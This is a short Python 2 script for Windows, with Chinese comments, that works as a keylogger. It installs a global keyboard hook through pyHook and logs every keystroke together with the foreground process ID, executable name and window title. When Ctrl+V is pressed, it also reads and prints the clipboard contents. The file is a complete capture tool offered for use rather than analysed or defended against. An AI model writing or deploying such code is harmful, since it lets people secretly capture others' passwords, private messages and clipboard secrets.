# -*- coding: utf-8 -*-

from ctypes import *
import win32gui
import time
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 =windll.kernel32
psapi = windll.psapi
current_window = None
##ls = []

def get_current_process():
    hwnd = user32.GetForegroundWindow()  ##获得前台句柄
    ##if hwnd not in ls:
    ## 获得进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
    process_id = "%d" % pid.value

    ##申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400|0x10,False,pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    ## 读取窗口标题
    window_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(window_title),512)

    window_title1 = win32gui.GetWindowText(hwnd)
    
    print
    print "[PID: %s - %s - %s]" % (process_id,executable.value,window_title.value)
    ##print window_title1
    ##ls.append(hwnd)

    ## 关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def keystroke(event):
    global current_window

    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    ## 检测按键是否为常规按键（非组合键）
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        ## ctrl+v的话，获取剪切板的内容
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print u"[粘贴板] - %s" % (pasted_value),
        else:
            print "[%s]" % event.Key,

    return True



if __name__ == "__main__":
    kl = pyHook.HookManager()
    kl.KeyDown = keystroke

    kl.HookKeyboard()
    pythoncom.PumpMessages()
